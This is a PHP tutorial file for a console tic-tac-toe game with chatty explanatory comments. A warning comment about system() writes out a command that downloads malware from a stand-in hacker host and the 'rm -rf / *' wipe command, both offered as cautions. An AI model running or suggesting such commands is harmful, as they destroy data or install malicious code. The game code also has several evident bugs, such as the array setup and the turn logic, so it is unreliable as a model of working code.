<?php
/**
 *
 *	Object Oriented TicTacToe Game
 *	Written by Simon Addicott
 *	Date 22/08/2022
 *
 */

// Lets define our class....

class TicTacToe {

	// That was easy, lol.
	// Next we'll define the class's properties!!

	/*
	 * array $table A 3x3 table can be represented using a 2D array. 
	* 		This provides us with values stored under X & Y
	 */
	private $table = [3][3];
        
	/*
	 * array $userA	An assosative array with 2 values, name & marker.
	 */
	private $userA = ["name" => "User One", "marker" => "X"];
        
	/*
         * array $userB Same as $userA, just the other user.
         */
	private $userB = ["name" => "User Two", "marker" => "0"];

	/*
	 * boolean $userATurn We'll use this value to tell us who's go it is
	 */
	private $userATurn = true;


	// Cool, now lets define some class functions

	//
	// This function will print our table to the screen.
	//
	private function printTable() {
		echo "- - - - - - - \n";
		echo " TIC TAC TOE\n";
		echo "- - - - - - - \n\n";
	
		// By using these for loops i can access all 9 indexes of my 2D array using only 1 line of code.
		// This is a much nicer way than writting out $table[0][0], $table[0][1], $table[0][2], etc
		
		for( $x = 2; $x >= 0; $x-- ){
			echo "$x ";
			for( $y = 0; $y < 3; $y++ ){
				if( !is_null($this->table[$y][$x]) ) {
	         			echo "  " .$this->table[$y][$x] . " ";
	        		} else {
					echo " -- ";
				}
			}
			echo "\n";
		}
		echo "   0   1    2";
		echo "\n";
	}
	
	//
	// This function will handle asking for user input & saving it to the class's $table property
	//
	private function getUserInput($user) {
		echo $user['name'] ."'s turn!\n";
		$x = readline("Please enter X: ");
		if( $x > 2 ) {
			echo "Only 0, 1 or 2 allowed!!";
			
		} else {
			$y = readline("Please enter Y: ");
			if( is_null($this->table[$x][$y])) {
				$this->table[$x][$y] = $user['marker'];
				return true;
			} else {
				echo "That position is already taken!";
				return false;
			}
		}
	}
	
	//
	// This simple function will clear the screen using a system command
	//
	// !!!!!!!!!!!!!!!!!!
	//       WARNING
	// !!!!!!!!!!!!!!!!!! 
	//
	// Becareful using system() method as you can do real damage to your computer or server.
	//
	// system("curl --download http://www.hacker.com/NastyVirus.sh" )
	// This example could download malware to your system
	//
	// system ("rm -rf / *")
	// This is the infamous DESTROY EVERYHTING command. Run this, and you will cry.
 	//

	private function clearScreen() {
		system("clear");
	}

	//
	// This function will check to see if anyone has won the game	
	//
	private function checkTableForWinner() {
		// todo
	}
	
	
	//
	// This is the construct method.
	// By default, this function will be called when we instantiate (spin up an instance) our class
	// Think of the construt(or) method as the boot loader of the class. Whatever needs to happen from
	// the get go, happens under this method
	//
	public function __construct() {
		while( true ) {
			$this->clearScreen();
			$this->printTable();
			if( $userATurn == true ) {
				$this->getUserInput($this->userB);
				$userATurn = false;
			} else {
				$this->getUserInput($this->userA);
				$userATurn = true;
			}
		}
	}
}

// ^^ aaaand thats it. Our class is now defined. 
// We're now outside of our class definition.
// We're now in bat country....


// right. now our class is defined, in order to start the TicTacToe game we just need to instantiate our class.
// You can do this anywhere, with any class by just called 'new <ClassName>;'
// Once this line is called the class's constructor will start up, and we'll be off into the land of TicTacToe!!
//
// Much exciting ^_^

$game = new TicTacToe();

// These tags btw, <?php & ?> are just to tell the PHP compiler where the code starts and ends.
?>